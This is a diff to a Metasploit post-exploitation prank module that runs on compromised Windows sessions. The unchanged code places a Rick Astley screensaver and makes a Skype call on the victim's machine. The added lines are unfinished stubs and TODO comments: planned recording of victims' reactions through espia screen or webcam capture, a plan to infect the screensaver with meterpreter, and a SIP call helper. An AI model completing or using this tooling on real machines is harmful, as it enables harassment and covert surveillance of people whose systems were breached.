@@ -49,6 +49,8 @@ class Metasploit3 < Msf::Post
 			change_system_icons
 		elsif datastore["COMMAND"].eql? "loadingscreen"
 			change_loading_screen
+		elsif datastore["COMMAND"].eql? "reaction"
+			record_reactions
 		elsif datastore["COMMAND"].eql? "music" and not datastore["PATH"].nil? 
 			change_music
 		else
@@ -131,6 +133,7 @@ class Metasploit3 < Msf::Post
 	end
 	
 	def install_screensaver
+		# TODO infect this with meterpreter to add insult to injury
 		print_status "Starting a Screensaver of Rick Astley"
 		path = ::File.join(Msf::Config.install_root, "data", "post")
                 rick_scr_filename = "rick.scr"
@@ -303,6 +306,10 @@ class Metasploit3 < Msf::Post
                 session.sys.process.execute("#{skype} /callto:+17722574501", nil, {'Hidden' => false}) # muhahaha
 		print_status "Callto command complete! I WANT YOU TO HEAR MY RAP ALBUM, BAMMMMMMMM!"
 	end
+
+	def call_rick_hotline_via_gv
+		#TODO deploy sip client to auto accept call made to it so that a call to the hotline can be facilitated
+	end
 	
 	def change_system_icons
 		#TODO UPLOAD VARIOUS .ico files, refer to this to get key to change => http://www.virtualplastic.net/html/icn_reg.html		
@@ -310,6 +317,10 @@ class Metasploit3 < Msf::Post
 	
 	def change_loading_screen
 		#TODO implement Ian's windows loading screen
+	end
+	
+	def record_reactions
+		#TODO figure out how espia works or how to call it
 	end
 
 end
